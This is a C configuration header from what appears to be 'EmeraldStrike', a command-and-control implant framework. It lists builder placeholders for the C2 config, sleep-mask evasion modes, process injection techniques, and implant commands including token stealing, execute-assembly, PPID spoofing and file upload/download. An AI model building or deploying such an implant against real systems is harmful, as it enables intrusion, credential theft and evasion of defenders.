#ifndef EMERALDSTRIKE_CONFIG_H
#define EMERALDSTRIKE_CONFIG_H

// Transport selection - stamped by builder
%TRANSPORT_DEFINE%

// Serialized C2 config blob - stamped by builder
static const unsigned char CONFIG_BYTES[] = { %CONFIG_BYTES% };

// Command selection - stamped by builder
%COMMAND_DEFINES%

// Evasion options - stamped by builder
%EVASION_DEFINES%

// Sleepmask COFF data - stamped by builder (UDRL mode only)
%SLEEPMASK_COFF_DEFINE%

// Sleep mask type constants
#define MASK_NONE    0
#define MASK_DEFAULT 1
#define MASK_EKKO    2
#define MASK_UDRL    3

// Beacon Gate - enable to route Win32 calls through sleepmask (requires MASK_UDRL)
#ifndef BEACON_GATE_ENABLED
#define BEACON_GATE_ENABLED 0
#endif

// Injection technique constants
#define INJECT_CRT     0
#define INJECT_APC     1
#define INJECT_SECTION 2
#define INJECT_CUSTOM  3

#ifndef INJECTION_TECHNIQUE
#define INJECTION_TECHNIQUE INJECT_CRT
#endif

// Command macros
#define INCLUDE_CMD_SHELL
#define INCLUDE_CMD_LS
#define INCLUDE_CMD_CD
#define INCLUDE_CMD_PWD
#define INCLUDE_CMD_CAT
#define INCLUDE_CMD_UPLOAD
#define INCLUDE_CMD_DOWNLOAD
#define INCLUDE_CMD_EXIT
#define INCLUDE_CMD_SLEEP
#define INCLUDE_CMD_WHOAMI
#define INCLUDE_CMD_GETUID
#define INCLUDE_CMD_PS
#define INCLUDE_CMD_KILL
#define INCLUDE_CMD_CP
#define INCLUDE_CMD_MV
#define INCLUDE_CMD_RM
#define INCLUDE_CMD_MKDIR
#define INCLUDE_CMD_INLINE_EXECUTE
#define INCLUDE_CMD_INJECT
#define INCLUDE_CMD_CONFIG
#define INCLUDE_CMD_SPAWNTO_X64
#define INCLUDE_CMD_SPAWNTO_X86
#define INCLUDE_CMD_SPAWN
#define INCLUDE_CMD_ARGUE
#define INCLUDE_CMD_EXECUTE_ASSEMBLY
#define INCLUDE_CMD_POWERPICK
#define INCLUDE_CMD_SCREENSHOT
#define INCLUDE_CMD_RUN
#define INCLUDE_CMD_EXECUTE
#define INCLUDE_CMD_MAKE_TOKEN
#define INCLUDE_CMD_STEAL_TOKEN
#define INCLUDE_CMD_REV2SELF
#define INCLUDE_CMD_GETPRIVS
#define INCLUDE_CMD_PPID
#define INCLUDE_CMD_BLOCKDLLS

#endif // EMERALDSTRIKE_CONFIG_H
